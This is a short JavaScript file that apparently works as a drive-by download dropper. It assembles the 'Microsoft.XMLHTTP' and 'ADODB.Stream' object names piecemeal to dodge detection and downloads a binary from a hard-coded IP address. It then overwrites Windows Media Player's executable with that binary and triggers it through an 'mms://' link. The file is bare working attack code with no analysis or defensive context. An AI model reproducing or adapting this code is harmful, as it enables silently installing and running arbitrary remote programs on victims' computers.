var blabla = "Microsoft";
blabla = blabla+".XML";
blabla = blabla+"HTTP";
var bleble = "ADODB";
bleble = bleble+".Stream";

var x = new ActiveXObject(blabla); 
x.Open("GET", "http://67.15.54.2/1.dat",0); 
x.Send(); 

var s = new ActiveXObject(bleble);
s.Mode = 3;
s.Type = 1;
s.Open();
s.Write(x.responseBody);

s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
location.href = "mms://";